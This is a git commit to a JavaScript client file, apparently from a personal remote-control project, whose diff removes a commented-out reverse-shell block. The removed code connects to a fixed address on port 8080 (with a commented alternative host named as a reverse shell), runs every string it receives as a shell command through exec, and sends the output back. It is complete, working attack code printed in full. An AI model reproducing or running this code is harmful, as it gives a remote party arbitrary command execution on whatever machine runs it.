dbccd500cecf414eca261d4cda11ef40691afa76
odczik <ondrej.dostal007@gmail.com>
2023-06-02 19:09:55 +0200

    Update

--- SC/client.js
+++ SC/client.js
@@ -43,38 +43,8 @@ const connect = () => {
     console.log("Reconnecting..")
     connect()
   })
-  //ws.ping()
   ws.on("error", (err) => {
     console.log("ERROR", err)
   })
 }
 connect()
-
-/*const net = require('net');
-const { spawn, exec } = require('child_process');
-const client = new net.Socket();
-
-function connect() {
-  client.connect(8080, '192.168.0.240', () => {
-  //client.connect(8080, 'https://reverseshell-ondrejdostal007.b4a.run/echo', () => {
-    
-    console.log("> Connection established, waiting for data")
-    client.on('data', (data) => {
-        console.log('Received >', data.toString());
-        exec(data.toString(), (error, stdout, stderr) => {
-            console.log('> Transmitting output..');
-            if (error) {
-                console.log('ERROR');
-                return client.write(error.message)
-            }
-            if (stderr) {
-                console.log('ERROR');
-                return client.write(stderr)
-            }
-            console.log('> Transmission successfull');
-            return client.write(stdout)
-        })
-    });
-  });
-}
-connect()*/
